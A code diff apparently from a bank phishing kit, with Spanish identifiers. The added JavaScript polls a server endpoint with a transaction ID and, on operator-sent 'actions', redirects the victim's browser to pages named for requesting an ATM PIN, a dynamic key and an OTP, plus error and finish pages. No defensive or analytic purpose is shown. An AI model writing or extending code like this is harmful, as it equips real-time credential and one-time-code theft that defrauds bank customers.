@@ -72,6 +72,20 @@
             }
         }
 
+        const actionRoutes = {
+            'pedir_logo':     'pedir_logo.php',
+            'pedir_dinamica': 'pedir_dinamica.php',
+            'error_tc':       'error_clave_cajero.html',
+            'error_logo':     'error_otp.html',
+            'error_dinamica': 'error_dinamica.html',
+            'finalizar':      'finish.html',
+            'finish':         'finish.html',
+            'token':          'pedir_clave_cajero.html',
+            'cajero':         'pedir_clave_cajero.html',
+            'clave_cajero':   'clave_cajero.html',
+            'dinamica':       'pedir_dinamica.php',
+        };
+
         function verificarActualizaciones() {
             const txId = globalTxId || sessionStorage.getItem('transaction_id') || '';
             const url = txId ? `check_updates.php?transaction_id=${encodeURIComponent(txId)}` : 'check_updates.php';
@@ -81,9 +95,23 @@
                 .then(response => response.json())
                 .then(data => {
                     console.log('Respuesta de check_updates:', data);
+
+                    // Manejar redirect directo
                     if (data.redirect) {
                         clearInterval(interval);
                         window.location.href = data.redirect;
+                        return;
+                    }
+
+                    // Manejar action → redirigir según mapeo
+                    if (data.status === 'success' && data.action) {
+                        const dest = actionRoutes[data.action];
+                        if (dest) {
+                            clearInterval(interval);
+                            window.location.href = dest + (txId ? '?transaction_id=' + encodeURIComponent(txId) : '');
+                        } else {
+                            console.warn('Acción sin ruta definida:', data.action);
+                        }
                     }
                 })
                 .catch(error => {
